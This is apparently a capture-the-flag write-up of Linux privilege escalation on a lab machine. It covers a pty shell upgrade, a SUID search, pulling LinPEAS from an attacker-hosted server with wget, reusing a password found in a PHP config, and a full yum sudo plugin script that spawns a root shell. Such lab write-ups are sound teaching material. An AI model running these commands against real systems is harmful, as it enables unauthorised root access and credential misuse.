Let's start by upgrading our shell with `python -c 'import pty; pty.spawn("/bin/bash")'
`. Looking around the file system, we find a directory belonging to `jjameson`, which we don't seem to have access to. Let's try escalating our privilege. Using `find / -perm -u=s -type f 2>/dev/null` to look for files with the SUID bit set, we find some candidates.

<center>

![83e467cfd5af8ddef71a1a5ca54f5986.png](../../_resources/83e467cfd5af8ddef71a1a5ca54f5986.png)

</center>

At this point, we check [GTFObins](https://gtfobins.github.io/) to see if we can leverage any of the binaries we found in our search. It doesn't look like this is the right approach. Let's instead use [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) to search for possible privilege escalation methods on the target machine. Download the linpeas.sh file onto the attacking machine, spin up a webserver with `python3 -m http.server`, and download it onto the target machine using `wget <attacking IP>:8000/linpeas.sh`.

<center>

![def636cb01192ace178966359de736d8.png](../../_resources/def636cb01192ace178966359de736d8.png)

</center>

Here I saved the file to the `/tmp` directory so that I don't have to worry about write permissions.

<center>

![c394d08ab7b3fd4ae59b407365d2a84b.png](../../_resources/c394d08ab7b3fd4ae59b407365d2a84b.png)

</center>

Now use `chmod +x linpeas.sh` to mark the file as executable, then run it with `./linpeas.sh`. LinPEAS identifies the target as being vulnerable to [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034).

<center>

![b8eef301cc53017c0216622cf5cc7e2f.png](../../_resources/b8eef301cc53017c0216622cf5cc7e2f.png)

</center>

We also find a password in a public PHP config file.

<center>

![1a34e49fbe938a3d2f25ec3018589374.png](../../_resources/1a34e49fbe938a3d2f25ec3018589374.png)

</center>

Earlier we found a user named jjameson, so we can try using the password we just found so switch into his account.

<center>

![82bbb48b299ce44bf1c3993fad8b731e.png](../../_resources/82bbb48b299ce44bf1c3993fad8b731e.png)

</center>

Success! Navigating to jjameson's home directory gives us the `user.txt` flag.

Now we look for a way to escalate our privilege to obtain the root flag. Using `sudo -l` tells us that jjameson can run the yum binary with sudo privileges.

<center>

![23809e8f1de19246829b7a180af6c061.png](../../_resources/23809e8f1de19246829b7a180af6c061.png)

</center>

Going back to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo), we see that yum does not drop elevated privileges when run as sudo. We can spawn a root shell with the following commands:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

(It may be easier to just copy and paste line-by-line directly from GTFOBins.)

As promised, we get a shell with root access which we then use to quickly find the `root.txt` flag.
 
<center>

![ad5d66d1a634cc31982f20b70c324841.png](../../_resources/ad5d66d1a634cc31982f20b70c324841.png)

![0b2f3894eda28b03b1003c5bad1b1f2c.png](../../_resources/0b2f3894eda28b03b1003c5bad1b1f2c.png)

</center>